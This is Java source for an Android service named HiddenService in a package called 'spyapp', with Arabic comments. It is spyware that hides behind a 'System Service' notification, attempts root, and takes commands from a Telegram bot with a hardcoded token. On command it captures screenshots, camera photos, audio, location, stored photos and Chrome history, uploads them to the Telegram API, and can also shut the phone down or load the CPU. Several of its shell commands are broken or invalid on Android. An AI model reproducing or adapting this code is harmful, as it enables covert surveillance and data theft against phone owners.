package com.osra.spyapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class HiddenService extends Service {
    private static final String TAG = "OsraSpy";
    private static final String BOT_TOKEN = "8959816262:AAFYV_BnH2o1Yia"; 
    private static final String CHAT_ID = "7077098458"; 
    
    private boolean isRunning = true;
    private static final String CHANNEL_ID = "OsraServiceChannel";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service Started");
        
        // إعداد الإشعار الأمامي بناءً على إصدار الأندرويد لتجنب الانهيار
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("System Service")
                    .setContentText("Running background sync...")
                    .setSmallIcon(android.R.drawable.ic_menu_info_details)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .build();
            startForeground(1, notification);
        }

        // محاولة طلب صلاحيات الجذر (Root) لضمان العمل على كافة الأجهزة
        try {
            Process suProcess = Runtime.getRuntime().exec("su");
            OutputStream os = suProcess.getOutputStream();
            os.write("id\n".getBytes());
            os.flush();
            Log.d(TAG, "Root Access Granted");
        } catch (Exception e) {
            Log.e(TAG, "No Root / Standard Mode", e);
        }

        // إرسال لوحة التحكم التفاعلية الخاصة بالجهاز
        sendControlPanel();

        // الاستماع لأوامر تليجرام في الخلفية
        startTelegramPolling();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Background Service Channel",
                    NotificationManager.IMPORTANCE_MIN
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void sendControlPanel() {
        new Thread(() -> {
            try {
                String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
                String androidVersion = Build.VERSION.RELEASE;
                
                String panelText = "🚨 تم اتصال جهاز جديد بنجاح!\n\n" +
                        "📱 اسم الجهاز: " + deviceName + "\n" +
                        "🤖 إصدار الأندرويد: " + androidVersion + "\n" +
                        "🟢 الحالة: متصل بالإنترنت ويعمل\n" +
                        "──────────────────────────";

                String jsonPayload = "{" +
                        "\"chat_id\":\"" + CHAT_ID + "\"," +
                        "\"text\":\"" + panelText.replace("\n", "\\n") + "\"," +
                        "\"parse_mode\":\"Markdown\"," +
                        "\"reply_markup\":{" +
                            "\"inline_keyboard\":[" +"[{\"text\":\"📸 لقطة شاشة\",\"callback_data\":\"screen\"}, {\"text\":\"🤳 كاميرا أمامية\",\"callback_data\":\"cam_front\"}]," +
                                "[{\"text\":\"📍 الموقع الحالي\",\"callback_data\":\"location\"}, {\"text\":\"🎙️ تسجيل صوت\",\"callback_data\":\"record_audio\"}]," +
                                "[{\"text\":\"🖼️ سحب الصور\",\"callback_data\":\"pull_photos\"}, {\"text\":\"🌐 معلومات الشبكة\",\"callback_data\":\"network_info\"}]," +
                                "[{\"text\":\"📜 سجل المتصفح\",\"callback_data\":\"browser_logs\"}, {\"text\":\"ℹ️ معلومات الجلسة\",\"callback_data\":\"session_info\"}]," +
                                "[{\"text\":\"🔥 ضغط المعالج\",\"callback_data\":\"burn\"}, {\"text\":\"🛑 إيقاف التشغيل\",\"callback_data\":\"shutdown\"}]" +
                            "]" +
                        "}" +
                    "}";

                sendJsonRequest("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", jsonPayload);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void startTelegramPolling() {
        new Thread(() -> {
            long lastUpdateId = 0;
            while (isRunning) {
                try {
                    URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=25");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    reader.close();

                    String resString = response.toString();
                    if (resString.contains("callback_query")) {
                        lastUpdateId = extractAndUpdateId(resString);
                        String command = extractCallbackData(resString);
                        if (command != null && !command.isEmpty()) {
                            executeCommand(command);
                        }
                    }
                } catch (Exception e) {
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                }
            }
        }).start();
    }

    private long extractAndUpdateId(String json) {
        try {
            int idx = json.lastIndexOf("update_id\":");
            if (idx != -1) {
                int start = idx + 11;
                int end = json.indexOf(",", start);
                if (end == -1) end = json.indexOf("}", start);
                return Long.parseLong(json.substring(start, end).trim());
            }
        } catch (Exception ignored) {}
        return 0;
    }

    private String extractCallbackData(String json) {
        try {
            int idx = json.indexOf("\"data\":\"");
            if (idx != -1) {
                int start = idx + 8;
                int end = json.indexOf("\"", start);
                return json.substring(start, end);
            }
        } catch (Exception ignored) {}
        return "";
    }

    private void executeCommand(String command) {
        switch (command) {
            case "screen": takeScreenshot(); break;
            case "cam_front": takeFrontCameraPhoto(); break;
            case "record_audio": recordAudioForOneMinute(); break;
            case "location": sendLocation(); break;
            case "shutdown": shutdownPhone(); break;
            case "burn": burnPhone(); break;
            case "pull_photos": pullPhotos(20); break;
            case "browser_logs": captureBrowserLogs(); break;
            case "session_info": getSessionInfo(); break;
            case "network_info": getNetworkInfo(); break;
        }
    }// --- الوظائف والمهام التنفيذية ---

    private void takeScreenshot() {
        new Thread(() -> {
            try {
                Process process = Runtime.getRuntime().exec("screencap -p /sdcard/screenshot.png");
                process.waitFor();
                uploadFile("/sdcard/screenshot.png", "screenshot.png");
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void takeFrontCameraPhoto() {
        new Thread(() -> {
            try {
                Runtime.getRuntime().exec(new String[]{"am", "start", "-a", "android.media.action.IMAGE_CAPTURE"}).waitFor();
                Runtime.getRuntime().exec("cmd camera take-photo --front").waitFor(); 
                uploadFile("/sdcard/DSC00001.jpg", "selfie.jpg");
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void recordAudioForOneMinute() {
        new Thread(() -> {
            try {
                Process p = Runtime.getRuntime().exec("sh");
                OutputStream os = p.getOutputStream();
                os.write("arecord -D plughw:1,0 -f S16_LE -r 44100 -d 60 /sdcard/recording.wav\n".getBytes());
                os.flush();
                uploadFile("/sdcard/recording.wav", "voice_recording.wav");
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void sendLocation() {
        new Thread(() -> {
            try {
                Process p = Runtime.getRuntime().exec("dumpsys location | grep mLastLocation");
                BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                StringBuilder sb = new StringBuilder();
                while ((line = in.readLine()) != null) sb.append(line).append("\n");
                sendMessage("📍 موقع الجهاز:\n" + sb.toString());
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void shutdownPhone() {
        try {
            Runtime.getRuntime().exec("reboot -p").waitFor();
        } catch (Exception e) {}
    }

    private void burnPhone() {
        try {
            Runtime.getRuntime().exec("echo 1 > /sys/class/thermal/thermal_zone0/temp");
            Runtime.getRuntime().exec("cpuset-cpus 0-3").waitFor();
            sendMessage("🔥 تم رفع أقصى حمل على المعالج.");
        } catch (Exception e) {}
    }

    private void pullPhotos(int count) {
        new Thread(() -> {
            try {
                Process p = Runtime.getRuntime().exec("find /sdcard/Pictures -type f -name '*.jpg' | head -n " + count);
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                List<String> files = new ArrayList<>();
                while ((line = br.readLine()) != null) files.add(line);
                
                for (String file : files) {
                    uploadFile(file, "photo_" + System.currentTimeMillis() + ".jpg");
                }
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void captureBrowserLogs() {
        new Thread(() -> {
            try {
                Process p = Runtime.getRuntime().exec("cat /data/data/com.android.chrome/app_webview/History");
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line).append("\n");
                sendMessage("📜 سجل المتصفح:\n" + sb.toString().substring(0, Math.min(sb.length(), 2000)));
            } catch (Exception e) {}
        }).start();
    }

    private void getSessionInfo() {try {
            Process p = Runtime.getRuntime().exec("ps | grep com.osra.spyapp");
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = br.readLine();
            if (line != null) {
                String[] parts = line.split("\\s+");
                if (parts.length > 7) {
                    sendMessage("ℹ️ معلومات الجلسة: PID=" + parts[1] + ", UID=" + parts[7]);
                }
            }
        } catch (Exception e) {}
    }

    private void getNetworkInfo() {
        try {
            Process p = Runtime.getRuntime().exec("netcfg");
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            StringBuilder sb = new StringBuilder();
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            sendMessage("🌐 معلومات الشبكة:\n" + sb.toString());
        } catch (Exception e) {}
    }

    // --- أدوات المساعدة ---

    private void uploadFile(String filePath, String fileName) {
        new Thread(() -> {
            try {
                File file = new File(filePath);
                if (!file.exists()) return;

                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                
                String boundary = "===";
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                
                OutputStream os = conn.getOutputStream();
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n").getBytes());
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"" + fileName + "\"\r\nContent-Type: image/jpeg\r\n\r\n").getBytes());
                
                byte[] buffer = new byte[1024];
                int bytesRead;
                java.io.FileInputStream fis = new java.io.FileInputStream(file);
                while ((bytesRead = fis.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                fis.close();
                
                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                os.flush();
                conn.connect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void sendMessage(String text) {
        try {
            String escapedText = text.replace("\n", "\\n").replace("\"", "\\\"");
            String jsonInputString = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + escapedText + "\",\"parse_mode\":\"Markdown\"}";
            sendJsonRequest("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", jsonInputString);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendJsonRequest(String targetUrl, String jsonPayload) {
        try {
            URL url = new URL(targetUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            
            OutputStream os = conn.getOutputStream();
            os.write(jsonPayload.getBytes("UTF-8"));
            os.flush();
            conn.connect();
            conn.getInputStream().close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}